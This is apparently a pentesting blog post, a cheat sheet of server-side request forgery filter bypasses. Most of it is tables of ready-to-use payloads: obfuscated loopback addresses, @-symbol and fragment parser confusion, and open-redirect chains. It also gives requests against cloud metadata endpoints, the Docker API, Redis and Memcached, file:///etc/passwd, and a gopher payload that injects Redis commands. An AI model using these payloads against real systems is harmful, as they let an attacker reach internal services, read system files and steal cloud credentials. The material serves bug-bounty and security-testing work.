---
title: " SSRF Bypass Payload Arsenal"
date: 2025-07-26 00:00:00 +0530
categories: [Vulnerability, SSRF]
tags: [Pentesting, Bug Bounty, SSRF, Vulnerability]
---

**These help bypass SSRF filters or reach internal services despite basic protections.**

### Common SSRF Filters You Might Face
-   Allowlist/Blacklist of domain or IP
-   `url.startsWith("http://")` or regex filtering
-   IP resolution checks (blocking `127.0.0.1`, etc.)
-   Schema restrictions (`http` only)

### IP Obfuscation Tricks

| Format | Payload Example | Purpose |
|--|--|
| Decimal | http://2130706433/ | 2130706433 = 127.0.0.1 |
| Hex | http://0x7f000001/ | Same as 127.0.0.1 |
| Octal | http://0177.0.0.1/ | Works if octal parsing is enabled |
| Mixed | http://127.1/ , http://127.000.000.001/ | Abbreviated loopback |
| Dotted Hex | http://0x7f.0x00.0x00.0x01/ | Segment-based hex |
| IPv6 | http://[::1]/ | Loopback IPv6 |
| DNS rebinding | Point DNS to internal IP | Server sees public IP but resolves internal |
| Encoded dots | http://127%2e0%2e0%2e1/ | URL-encoded dot bypass |

### Hostname Tricks

| Trick Type | Example |
|--|--|
| @ Symbol Confusion | http://127.0.0.1@evil.com/ |
| Reversed @ | http://evil.com@127.0.0.1/ |
| Fragment Bypass | http://127.0.0.1#evil.com/ |
| Encoded Fragment | http://127.0.0.1%23evil.com/ |

### Redirection & Open Redirect

| Type | Example |
|--|--|
| Redirect → Internal | http://evil.com/redirect?url=127.0.0.1 |
| Double Redirect Chain | evil.com → internal.com → 127.0.0.1 |
| URL Shortener Bypass | tinyurl.com/internalip |

### Redirect Bypass Tricks
```bash
http://evil.com/redirect?next=http://127.0.0.1/
```

| Trick | Description |
|--|--|
| Open Redirect + SSRF | Combine vulnerable redirect to reach internal resources |
| Double Redirect | Redirects to a URL that further redirects to internal IP |
| Wildcard DNS | Use domains like anything.yourdomain.com to simulate internal subdomains |
| URL shorteners | TinyURL or your own shortener to mask real internal target |

### URL Parser Confusion Tricks

| Payload | Behavior |
|--|--|
| http://127.0.0.1@evil.com/ | Looks like internal IP, but resolves to evil.com |
| http://evil.com@127.0.0.1/ | Most parsers think host is 127.0.0.1 |
| http://127.0.0.1#evil.com/ | Fragment ignored by server, only browser cares |
| http://127.0.0.1%23evil.com/ | Encoded # to confuse filters |

### SSRF to Internal Services
| Target | Payload |
|--|--|
| AWS Metadata | http://169.254.169.254/latest/meta-data/ |
| GCP Metadata | http://169.254.169.254/computeMetadata/v1/ (Add Metadata-Flavor: Google ) |
| Docker socket | http://localhost:2375/containers/json |
| Redis | gopher://127.0.0.1:6379/_PING |
| MySQL | mysql://127.0.0.1:3306/ |
| Memcached | memcached://127.0.0.1:11211

### Protocol Smuggling (Advanced)
If server allows more than `http://` ,  try :

-   `file://` – access local files
-   `gopher://` – inject raw bytes (Redis, FTP, etc.)
-   `dict://127.0.0.1:11211/` – another bypass channel
-   `ftp://`, `sftp://`, etc. – protocol abuse

Example :

```bash
gopher://127.0.0.1:6379/_%2a1%0d%0a%24%34%0d%0aPING%0d%0a
```

| Protocol | Payload Example |
|--|--|
| file:// | file:///etc/passwd |
| gopher:// | gopher://127.0.0.1:6379/... |
| dict:// | dict://127.0.0.1/ |
| ftp:// | ftp://127.0.0.1/ |

